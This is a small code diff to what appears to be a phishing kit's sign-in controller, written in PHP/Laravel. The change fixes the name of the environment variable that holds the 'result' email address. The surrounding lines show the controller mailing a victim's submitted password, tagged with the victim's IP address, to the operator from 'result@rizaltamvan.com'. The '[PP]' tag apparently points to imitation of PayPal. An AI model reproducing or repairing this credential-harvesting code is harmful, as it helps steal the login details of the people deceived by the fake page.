@@ -19,7 +19,7 @@ class SignInController extends Controller
           'password' => $request->password
         ],function($mail){
           $mail->subject("[SETOR][PP][" . $_SERVER['REMOTE_ADDR'] . "]");
-          $mail->to(env("RESULT_EMAIl"));
+          $mail->to(env("RESULT_EMAIL"));
           $mail->from("result@rizaltamvan.com", "RESULT GANTENG");
         });
 
